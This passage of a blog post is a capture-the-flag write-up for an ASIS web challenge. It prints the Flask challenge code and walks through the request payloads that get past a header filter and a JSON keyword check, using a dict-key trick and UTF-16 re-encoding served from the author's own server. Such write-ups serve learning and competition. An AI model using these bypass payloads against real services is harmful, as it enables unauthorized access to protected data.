+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;host&#34;</span>:<span style="color:#48b685">&#34;flag-container&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;headers&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">&#34;X-Request&#34;</span>:<span style="color:#48b685">&#34;something&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">&#34; flag&#34;</span>: <span style="color:#48b685">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;method&#34;</span>:<span style="color:#48b685">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;path&#34;</span>:<span style="color:#48b685">&#34;/flag&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;returnJson&#34;</span>:<span style="color:#815ba4">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We will see that the <strong>flag</strong> is indeed within the <strong>X-Request</strong> header:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>firewalled-flag-container-1   | <span style="color:#5bc4bf">[</span>...<span style="color:#5bc4bf">]</span> something flag: x True
+</span></span></code></pre></div><h2 id="json-response">JSON response</h2>
+<p>So now we need to bypass the second part. We need to get a json response with a <strong>flag</strong> in the <strong>request</strong> element.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">index</span>():
+</span></span><span style="display:flex;"><span>[<span style="color:#ef6155">!</span>] args <span style="color:#5bc4bf">=</span> request<span style="color:#5bc4bf">.</span>args<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;args&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>[<span style="color:#ef6155">!!</span>]	r <span style="color:#5bc4bf">=</span> requests<span style="color:#5bc4bf">.</span>post(<span style="color:#48b685">&#39;http://firewalled-curl/req&#39;</span>,json<span style="color:#5bc4bf">=</span>json<span style="color:#5bc4bf">.</span>loads(args))<span style="color:#5bc4bf">.</span>json()
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;request&#39;</span> <span style="color:#5bc4bf">in</span> r <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> r[<span style="color:#48b685">&#39;request&#39;</span>] <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> request<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#39;X-Request&#39;</span>]:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> flag
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">pass</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#48b685">&#39;No flag for you :(&#39;</span>
+</span></span></code></pre></div><p>The route gets <code>[!] args</code> from the request and passes it as a json body to the <code>[!!] /req</code> endpoint of <strong>firewalled-curl</strong>.</p>
+<p>Let&rsquo;s examine the logic behind the <strong>firewalled-curl</strong> response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#815ba4">if</span>(isJson(body<span style="color:#5bc4bf">.</span>decode())): [<span style="color:#ef6155">!!!</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#776e71">#something like if &#39;flag&#39; anywhere in json -- return error</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(json<span style="color:#5bc4bf">.</span>loads(body<span style="color:#5bc4bf">.</span>decode()))):
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;success&#39;</span>:<span style="color:#815ba4">False</span>,<span style="color:#48b685">&#39;error&#39;</span>:<span style="color:#48b685">&#39;unsafe json&#39;</span>}
+</span></span><span style="display:flex;"><span>    headers[<span style="color:#48b685">&#39;Content-Type&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>    headers[<span style="color:#48b685">&#39;Content-Type&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;application/octet-stream&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">if</span>(returnJson): [<span style="color:#ef6155">!</span>]
+</span></span><span style="display:flex;"><span>    body <span style="color:#5bc4bf">=</span> base64<span style="color:#5bc4bf">.</span>b64encode(body)<span style="color:#5bc4bf">.</span>decode()
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;statusCode&#39;</span>:statusCode,<span style="color:#48b685">&#39;headers&#39;</span>:headers,<span style="color:#48b685">&#39;body&#39;</span>:body,<span style="color:#48b685">&#39;req&#39;</span>:httpRequest<span style="color:#5bc4bf">.</span>decode()}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>resp <span style="color:#5bc4bf">=</span> Response(body)
+</span></span><span style="display:flex;"><span>resp<span style="color:#5bc4bf">.</span>status <span style="color:#5bc4bf">=</span> statusCode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">for</span> headerName <span style="color:#5bc4bf">in</span> headers:
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">for</span> badHeaderName <span style="color:#5bc4bf">in</span> badHeaderNames:
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span>(badHeaderName <span style="color:#5bc4bf">not</span> <span style="color:#5bc4bf">in</span> headerName<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>            resp<span style="color:#5bc4bf">.</span>headers[headerName] <span style="color:#5bc4bf">=</span> headers[headerName]
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">return</span> resp [<span style="color:#ef6155">!!</span>]
+</span></span></code></pre></div><p>First of all, as you may have already noticed, there&rsquo;s a <code>&quot;returnJson&quot;: true</code> parameter in my requests to <code>/req</code>. It tells <strong>firewalled-curl</strong> to wrap the data into the json response instead of just printing the body. <code>([!] line)</code></p>
+<p>In case the parameter <strong>returnJson</strong> equals to <strong>false</strong>, <strong>firewalled-curl</strong> just returns the actual response. <code>([!!] line)</code></p>
+<p>Because the response with <strong>returnJson</strong> setted to <strong>true</strong> doesn&rsquo;t contain <strong>request</strong> element in its object, we just need to set <strong>returnJson</strong> to <strong>false</strong> and make a request that will return correct json body with <strong>request</strong> element.</p>
+<p>But there&rsquo;s a problem. <strong>firewalled-curl</strong> checks whether the body contains a <code>flag</code> substring that we need for bypassing the check. <code>([!!!] line)</code></p>
+<p>The code for the check looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">isJson</span>(s):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>	    json<span style="color:#5bc4bf">.</span>loads(s)
+</span></span><span style="display:flex;"><span>	    <span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkJson</span>(j):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(type(j) <span style="color:#5bc4bf">==</span> str):
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span>(<span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> j<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">elif</span>(type(j) <span style="color:#5bc4bf">==</span> list):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> entry <span style="color:#5bc4bf">in</span> j:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(entry)):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">elif</span>(type(j) <span style="color:#5bc4bf">==</span> dict):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> entry <span style="color:#5bc4bf">in</span> j:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(j[entry])):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span></code></pre></div><p>It recursively searches for all the json object elements and returns <strong>False</strong> in case <strong>flag</strong> is within the element with type <strong>str</strong>.</p>
+<h2 id="solution-to-the-second-problem">Solution to the second problem</h2>
+<p>The bug is quite easy to spot. If <strong>request</strong> is a dict with element like <strong>&ldquo;flag&rdquo;:&ldquo;sth&rdquo;</strong>, only the <strong>&ldquo;sth&rdquo;</strong> string will be checked later in recursion.</p>
+<p>Also the check from <strong>flag-container</strong> (<code>'request' in r and 'flag' in r['request']</code>) will return <strong>True</strong> because <strong>request</strong> element is indeed within the response and has a key <strong>flag</strong> in it.</p>
+<p>So to pass both checks, we need to set up a server that will return <code>{&quot;request&quot;:{&quot;flag&quot;:&quot;sth&quot;}}</code>.</p>
+<h3 id="upd-intended-solution">[upd] Intended solution</h3>
+<p>It turned out that the intended solution was changing the encoding of a json file. The <strong>isJson</strong> function from <strong>firewalled-curl</strong> was failing in the <code>try {} catch {}</code> block in case non utf-8 encoding was using.</p>
+<p>You can get the utf-16 .json file using the following commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% echo <span style="color:#5bc4bf">{</span><span style="color:#48b685">&#34;request&#34;</span>:<span style="color:#48b685">&#34;flag&#34;</span><span style="color:#5bc4bf">}</span> &gt; secret.json
+</span></span><span style="display:flex;"><span>% iconv -f ASCII -t UTF-16 secret.json -o secret_utf16.json
+</span></span></code></pre></div><p>After it, you need to remove the first 2 byte-order-mark bytes so that <strong>body.decode()</strong> won’t fail. <strong>Response.json()</strong> from <strong>flag-container</strong> will still correctly guess the encoding (<a href="https://github.com/psf/requests/blob/main/requests/utils.py#L950)">https://github.com/psf/requests/blob/main/requests/utils.py#L950)</a>, but <strong>firewalled-curl</strong> will fail to detect the json response.</p>
+<h2 id="flag">Flag</h2>
+<p>The final request body will look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;host&#34;</span>:<span style="color:#48b685">&#34;flag-container:80&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;headers&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">&#34;X-Request&#34;</span>:<span style="color:#48b685">&#34;sth&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">&#34; flag&#34;</span>:<span style="color:#48b685">&#34;sth&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;method&#34;</span>:<span style="color:#48b685">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;path&#34;</span>:<span style="color:#48b685">&#34;/flag?args={\&#34;host\&#34;:\&#34;own_server:1000\&#34;,\&#34;headers\&#34;:{},\&#34;method\&#34;:\&#34;GET\&#34;,\&#34;path\&#34;:\&#34;/secret.json\&#34;,\&#34;returnJson\&#34;:false}&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&#34;returnJson&#34;</span>:<span style="color:#815ba4">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The content of <code>http://own_server:1000/secret.json</code> is <code>{&quot;request&quot;:{&quot;flag&quot;:&quot;sth&quot;}}</code>.</p>
+<p><img src="/images/RMo6lTcKeTSsel6is9AtxGZB5aCR8r0Q" alt="img"></p>
+<p>And the flag is <code>ASIS{SEEmS-l1KE-y0u-KN0w-h77p}</code></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/ctf">ctf</a></li>
+					
+					<li><a href="/tags/python">python</a></li>
+					
+					<li><a href="/tags/flask">flask</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/sh1yo" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/sh1yo_/" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  © sh1yo |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NTWQD4HQWT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-NTWQD4HQWT', { 'anonymize_ip': false });
+}
+</script>
+<Paste><script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
